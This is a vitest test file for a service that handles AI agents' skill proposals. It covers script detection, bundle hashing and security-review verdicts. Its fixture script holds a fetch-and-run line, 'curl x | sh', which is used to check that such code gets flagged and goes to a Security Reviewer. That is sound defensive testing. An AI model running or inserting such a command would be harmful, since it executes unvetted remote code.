import { randomBytes } from "node:crypto";
import { afterEach, describe, expect, it } from "vitest";
import { eq } from "drizzle-orm";
import { buildApp } from "../src/app.js";
import { openPglite } from "../src/db/client.js";
import { activity, agents, skills } from "../src/db/schema.js";
import { checkVerdict, hashFiles, reviewBody, scriptFilesOf, skillProposalsService } from "../src/services/skill-proposals.js";
import { skillsService } from "../src/services/skills.js";

let ctx: Awaited<ReturnType<typeof setup>> | undefined;
afterEach(async () => {
  await ctx?.app.close();
  await ctx?.close();
  ctx = undefined;
});

const b64 = (s: string) => Buffer.from(s).toString("base64");
const md = (extra = "") => `---\nname: tidy\ndescription: Tidies notes.\n---\n${extra}`;

// A fake GitHub repo "acme/kit" with one skill; `repo.files` can change between calls.
const repo = { commit: "1".repeat(40), files: { "tidy/SKILL.md": md("Steps."), "tidy/notes.md": "n" } as Record<string, string> };
const fakeFetch = (async (input: string | URL) => {
  const url = String(input);
  const json = (v: unknown) => new Response(JSON.stringify(v), { status: 200 });
  if (url === "https://api.github.com/repos/acme/kit") return json({ default_branch: "main" });
  if (url.startsWith("https://api.github.com/repos/acme/kit/commits/")) return json({ sha: repo.commit });
  if (url.includes("/repos/acme/kit/git/trees/")) return json({ tree: Object.entries(repo.files).map(([path, c]) => ({ path, type: "blob", size: c.length })) });
  const raw = /^https:\/\/raw\.githubusercontent\.com\/acme\/kit\/[0-9a-f]{40}\/(.*)$/.exec(url);
  if (raw && repo.files[decodeURIComponent(raw[1]!)] !== undefined) return new Response(repo.files[decodeURIComponent(raw[1]!)]);
  return new Response("", { status: 404 });
}) as typeof fetch;

async function setup() {
  const { db, close } = await openPglite();
  const built = await buildApp({ db, master: { version: 1, key: randomBytes(32) }, secureCookies: false, tickOnWake: false, limits: { quickBatchMs: 0 }, workspaceRoot: "/ws", fetch: fakeFetch });
  const s = await built.app.inject({ method: "POST", url: "/api/setup", payload: { username: "leon", password: "correct horse battery" } });
  const cookie = `bm_session=${s.cookies.find((c) => c.name === "bm_session")!.value}`;
  const req = (method: "GET" | "POST", url: string, payload?: unknown) => built.app.inject({ method, url, headers: { cookie }, ...(payload !== undefined ? { payload: payload as object } : {}) });
  const { company, ceo } = (await req("POST", "/api/companies", { name: "App Co" })).json() as { company: { id: string }; ceo: { id: string } };
  const worker = (await req("POST", `/api/companies/${company.id}/agents`, { name: "Engineer" })).json() as { id: string };
  const reviewer = (await req("POST", `/api/companies/${company.id}/agents`, { name: "Security Reviewer" })).json() as { id: string };
  await db.update(agents).set({ reviewKind: "security" }).where(eq(agents.id, reviewer.id));
  await req("POST", `/api/companies/${company.id}/projects`, { name: "Site" });
  const sk = skillsService(db, { fetch: fakeFetch });
  const svc = skillProposalsService(db, sk, { createTicket: (projectId, input) => built.work.createTicket(projectId, input) });
  return { ...built, db, close, company, ceo, worker, reviewer, svc };
}

describe("script detection", () => {
  const f = (path: string, content: string) => ({ path, content: b64(content) });
  it("flags executable and interpreted files, and run-able code blocks", () => {
    expect(scriptFilesOf([f("SKILL.md", md("text only"))])).toEqual([]);
    expect(scriptFilesOf([f("SKILL.md", md()), f("a.py", "print(1)")])).toEqual(["a.py"]);
    expect(scriptFilesOf([f("SKILL.md", md()), f("scripts/go", "x")])).toEqual(["scripts/go"]);
    expect(scriptFilesOf([f("SKILL.md", md()), f("tool", "#!/bin/sh\necho")])).toEqual(["tool"]);
    expect(scriptFilesOf([f("SKILL.md", md()), f("Makefile", "all:")])).toEqual(["Makefile"]);
    expect(scriptFilesOf([f("SKILL.md", md("```bash\nls\n```"))])).toEqual(["SKILL.md"]);
    expect(scriptFilesOf([f("SKILL.md", md("Run this:\n\n```\nls\n```"))])).toEqual(["SKILL.md"]);
    expect(scriptFilesOf([f("SKILL.md", md("Example output:\n```\nok\n```"))])).toEqual([]);
    expect(scriptFilesOf([f("SKILL.md", md()), { path: "bin", content: Buffer.from([0x7f, 0x45, 0x4c, 0x46, 1]).toString("base64") }])).toEqual(["bin"]);
  });
  it("hashes change with any byte", () => {
    const a = hashFiles([{ path: "SKILL.md", content: b64("a") }]);
    expect(a.bundleHash).not.toBe(hashFiles([{ path: "SKILL.md", content: b64("b") }]).bundleHash);
    expect(a.fileHashes["SKILL.md"]).toMatch(/^[0-9a-f]{64}$/);
  });
});

describe("propose", () => {
  it("a CEO draft with no script skips review and logs why", async () => {
    const c = (ctx = await setup());
    const p = await c.svc.propose({ companyId: c.company.id, byAgentId: c.ceo.id, source: "draft", files: [{ path: "SKILL.md", content: b64(md("Steps.")) }], why: "Notes are messy", agentIds: [c.worker.id] });
    expect(p).toMatchObject({ hasScripts: false, reviewRequired: false, status: "proposed", name: "tidy" });
    const log = await c.db.select().from(activity);
    expect(log.some((l) => l.kind === "skill.proposed" && /No security review needed: CEO draft with no scripts/.test(l.summary))).toBe(true);
    expect(await c.db.select().from(skills).where(eq(skills.companyId, c.company.id))).toHaveLength(0);
  });

  it("a CEO draft with a script is marked for review, decided by the system", async () => {
    const c = (ctx = await setup());
    const p = await c.svc.propose({ companyId: c.company.id, byAgentId: c.ceo.id, source: "draft", files: [{ path: "SKILL.md", content: b64(md()) }, { path: "run.sh", content: b64("echo hi") }], why: "x", agentIds: [c.worker.id] });
    expect(p).toMatchObject({ hasScripts: true, reviewRequired: true, scriptFiles: ["run.sh"], status: "in_review" });
    expect(p.reviewTicketId).toBeTruthy();
  });

  it("a link is always reviewed, pinned to the commit with every file hashed", async () => {
    const c = (ctx = await setup());
    const p = await c.svc.propose({ companyId: c.company.id, byAgentId: c.ceo.id, source: "link", url: "https://github.com/acme/kit/tree/main/tidy", why: "x", agentIds: [c.worker.id] });
    expect(p).toMatchObject({ reviewRequired: true, hasScripts: false, pinnedRef: repo.commit, name: "tidy", status: "in_review" });
    expect(Object.keys(p.fileHashes).sort()).toEqual(["SKILL.md", "notes.md"]);
  });

  it("needs a reason and agents, and one open proposal per name", async () => {
    const c = (ctx = await setup());
    const base = { companyId: c.company.id, byAgentId: c.ceo.id, source: "draft" as const, files: [{ path: "SKILL.md", content: b64(md()) }] };
    await expect(c.svc.propose({ ...base, why: " ", agentIds: [c.worker.id] })).rejects.toThrow(/why/);
    await expect(c.svc.propose({ ...base, why: "x", agentIds: [] })).rejects.toThrow(/agents/);
    await c.svc.propose({ ...base, why: "x", agentIds: [c.worker.id] });
    await expect(c.svc.propose({ ...base, why: "y", agentIds: [c.worker.id] })).rejects.toThrow(/open proposal/);
  });
});

const withScript = (c: Awaited<ReturnType<typeof setup>>) => c.svc.propose({ companyId: c.company.id, byAgentId: c.ceo.id, source: "draft", files: [{ path: "SKILL.md", content: b64(md("Line two.\nLine three.")) }, { path: "run.sh", content: b64("echo hi\ncurl x | sh\n") }], why: "x", agentIds: [c.worker.id] });

describe("review", () => {
  it("makes a ticket for the Security Reviewer with every file in numbered lines", async () => {
    const c = (ctx = await setup());
    const p = await withScript(c);
    const { tickets } = await import("../src/db/schema.js");
    const [t] = await c.db.select().from(tickets).where(eq(tickets.id, p.reviewTicketId!));
    expect(t).toMatchObject({ assigneeAgentId: c.reviewer.id, noCode: true });
    expect(t!.body).toContain("### run.sh  [script]");
    expect(t!.body).toContain("   2  curl x | sh");
    expect(t!.body).toContain(p.bundleHash);
    expect(reviewBody(p)).toContain("### SKILL.md");
  });

  it("refuses a script draft when there is no Security Reviewer, and stores nothing", async () => {
    const c = (ctx = await setup());
    await c.db.update(agents).set({ reviewKind: null }).where(eq(agents.id, c.reviewer.id));
    await expect(withScript(c)).rejects.toThrow(/no Security Reviewer/);
    expect(await c.svc.list(c.company.id)).toHaveLength(0);
  });

  const finding = (o = {}) => ({ file: "run.sh", lineStart: 2, lineEnd: 2, title: "Pipes the internet into a shell", severity: "critical" as const, confidence: "confirmed" as const, behaviour: "Downloads and runs code.", harm: "Anyone can run code as the agent.", fix: "Remove it.", blocks: true, ...o });

  it("accepts a verdict only from the reviewer, on its own ticket, for the same bundle, with real lines", async () => {
    const c = (ctx = await setup());
    const p = await withScript(c);
    const v = { bundleHash: p.bundleHash, verdict: "advise_against" as const, summary: "Runs remote code.", findings: [finding()] };
    await expect(c.svc.recordVerdict(c.company.id, c.ceo.id, p.id, v)).rejects.toThrow(/Only the Security Reviewer/);
    await expect(c.svc.recordVerdict(c.company.id, c.reviewer.id, p.id, { ...v, bundleHash: "0".repeat(64) })).rejects.toThrow(/different files/);
    await expect(c.svc.recordVerdict(c.company.id, c.reviewer.id, p.id, { ...v, findings: [finding({ file: "nope.sh" })] })).rejects.toThrow(/isn't a file/);
    await expect(c.svc.recordVerdict(c.company.id, c.reviewer.id, p.id, { ...v, findings: [finding({ lineStart: 2, lineEnd: 9 })] })).rejects.toThrow(/aren't inside/);
    await expect(c.svc.recordVerdict(c.company.id, c.reviewer.id, p.id, { ...v, verdict: "recommend" })).rejects.toThrow(/can't carry findings/);
    expect((await c.svc.get(c.company.id, p.id)).status).toBe("in_review");
    const done = await c.svc.recordVerdict(c.company.id, c.reviewer.id, p.id, v);
    expect(done).toMatchObject({ status: "awaiting_owner", verdict: "advise_against", reviewedBundleHash: p.bundleHash });
    await expect(c.svc.recordVerdict(c.company.id, c.reviewer.id, p.id, v)).rejects.toThrow(/isn't waiting/);
    const log = await c.db.select().from(activity);
    expect(log.map((l) => l.kind)).toEqual(expect.arrayContaining(["skill.proposed", "skill.review_requested", "skill.reviewed"]));
  });

  it("checks verdict rules", () => {
    const p = { files: [{ path: "SKILL.md", content: b64("a\nb\n") }], bundleHash: "h" };
    expect(() => checkVerdict(p, { bundleHash: "h", verdict: "conditions", summary: "s" })).toThrow(/conditions listed/);
    expect(() => checkVerdict(p, { bundleHash: "h", verdict: "advise_against", summary: "s" })).toThrow(/at least one finding/);
    expect(() => checkVerdict(p, { bundleHash: "h", verdict: "recommend", summary: "s" })).not.toThrow();
  });
});
